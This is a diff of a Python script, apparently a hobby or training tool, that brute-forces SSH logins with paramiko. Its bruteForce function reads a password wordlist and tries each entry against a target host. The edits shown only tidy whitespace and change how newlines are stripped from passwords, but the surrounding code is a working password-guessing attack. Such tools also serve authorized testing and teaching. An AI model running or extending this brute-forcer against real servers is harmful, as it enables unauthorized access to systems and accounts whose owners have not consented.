@@ -38,9 +38,8 @@ def runCheckPass():
     print(" ")
 
 def sshConnect(ssh_host,ssh_user,ssh_pwd,connectStat = 0):
-    ssh = paramiko.SSHClient()
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    
+    ssh = paramiko.SSHClient() 
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
 
     try:
         ssh.connect(ssh_host, username=ssh_user, password=ssh_pwd)
@@ -59,7 +58,7 @@ def bruteForce():
 
     with open(filePath) as wordList:
         for passWrd in wordList:
-            ssh_pwd = passWrd.strip('\n')
+            ssh_pwd = passWrd.strip()
             connection = sshConnect(ssh_host,ssh_user,ssh_pwd)
 
             if connection == 0:
@@ -71,9 +70,6 @@ def bruteForce():
                 print("Connection could not be establish to: " + str(ssh_host))
             else:
                 print ("UNKOWN ERROR")
-        
-        
-  
     print(" ")
 
 ##############################################################################
